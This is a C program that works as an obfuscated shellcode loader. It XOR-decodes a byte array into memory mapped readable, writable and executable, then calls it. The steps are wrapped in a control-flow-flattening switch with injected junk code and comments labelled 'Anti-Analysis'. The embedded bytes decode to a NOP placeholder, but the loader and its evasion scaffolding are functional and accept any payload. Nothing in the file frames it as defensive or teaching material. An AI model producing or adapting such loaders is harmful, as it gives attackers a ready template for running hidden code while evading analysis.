
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    unsigned char todgcc[] = { 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4, 0xe4 };
    unsigned char xvdv = 116;
    void *ermnc = 0;
    int sad = 0;
    
    // CONTROL FLOW FLATTENING DISPATCHER
    int ccqdt = 5;
    
    while(ccqdt != 4) {
        // Dead Code Injection (Junk Math)
        volatile int junk = 48; junk++;
        
        switch(ccqdt) {
            case 5:
                // State 1: Initialization (Mental NOP)
                ccqdt = 3;
                break;
                
            case 3:
                // State 2: Allocation
                ermnc = mmap(0, sizeof(todgcc), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                ccqdt = 1;
                break;
                
            case 1:
                // State 3: Decryption Loop
                for (sad = 0; sad < sizeof(todgcc); sad++) {
                    ((unsigned char*)ermnc)[sad] = todgcc[sad] ^ xvdv;
                }
                ccqdt = 2;
                break;
                
            case 2:
                // State 4: Execution
                ((void (*)())ermnc)();
                ccqdt = 4;
                break;
                
            default:
                // Anti-Analysis: Fake states
                junk = junk * 2;
                break;
        }
    }
    return 0;
}
